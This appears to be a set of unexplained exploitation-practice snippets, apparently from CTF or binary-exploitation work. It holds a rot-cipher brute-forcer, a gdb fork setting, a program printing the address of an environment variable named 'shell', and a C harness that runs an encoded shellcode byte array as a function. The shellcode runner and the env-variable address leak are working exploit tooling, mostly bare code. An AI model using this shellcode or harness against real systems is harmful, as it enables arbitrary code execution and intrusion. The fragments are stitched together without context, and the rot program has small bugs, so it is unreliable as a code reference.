#include <iostream>

int main(int argc, char **argv)
{
    std::string rotedString = argv[2];
    std::string comparedString;
    std::cout << "Usage: ./rot string rotedString" << std::endl;
    if (argc >3)
        return 1;
    for (int j =10; j<20;j++)
    {
        comparedString = "";
        for (int i =0; i<strlen(argv[1]);i++)
        {
            int b = int(argv[1][i])-j;
            while (b < 33)
                b = 127-(33-b);
            if (j+int(argv[1][i]) > 127)
                comparedString += char(b);
            else
                comparedString += (argv[1][i]-j);
        }
        std::cout << comparedString << std::endl;
        if (rotedString == comparedString)
            std::cout << "It's a rot"+ std::to_string(j) << std::endl;
    }
    std::cout << "Done" << std::endl;
    return 0;
}

set follow-fork-mode child

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("shell"));
}

#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = 
"\xbd\x2c\x51\xd6\xa6\xdb\xd5\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x13\x31\x6f\x13\x03\x6f\x13\x83\xef\xd0\xb3\x23\x4d\x1e\x8c"
"\xc9\x92\x5e\xec\x8a\xa3\x97\x21\xac\x4d\xe4\x02\xae\x4d\xea"
"\x72\x38\xaa\x63\x8b\x80\x35\x63\x6c\xf5\xf8\x03\xe5\x37\xba"
"\x07\xf6\xb7\xbb\xbc\xf7\xb7\xbb\xc2\x3a\x37\x03\xc3\xc4\x38"
"\x74\x78\xc4\x38\x74\x7e\x08\xb8\x9c\xbb\x6d\x46\xa3\x6c\xf7"
"\xcd\x3f\x5d\x87\x4c\xb3\xd2\x10\xeb\x33";


int main(int argc, char *argv[])
{
	int (*ret)() = (int(*)())shellcode;
	ret();
}